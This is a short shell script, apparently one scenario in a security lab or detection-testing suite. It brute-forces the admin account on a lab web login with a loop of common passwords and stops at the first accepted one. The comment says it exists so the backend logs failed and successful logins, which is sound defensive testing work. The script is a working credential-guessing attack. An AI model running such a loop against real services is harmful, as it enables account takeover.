#!/bin/sh
# 3b. Web login brute force on /api/login: a series of wrong passwords for admin,
# then the real one. Each attempt is logged by the backend (login failed/success).
. "$(dirname "$0")/../lib.sh"
echo "3b. Force brute sur le login web (compte admin)"
on public sh -c '
for p in 123456 password admin root qwerty letmein monkey dragon soleil azerty123; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --data "u=admin&p=$p" http://traefik-public/api/login)
    [ "$code" = "200" ] && echo "mot de passe trouve: $p" && break
done
'
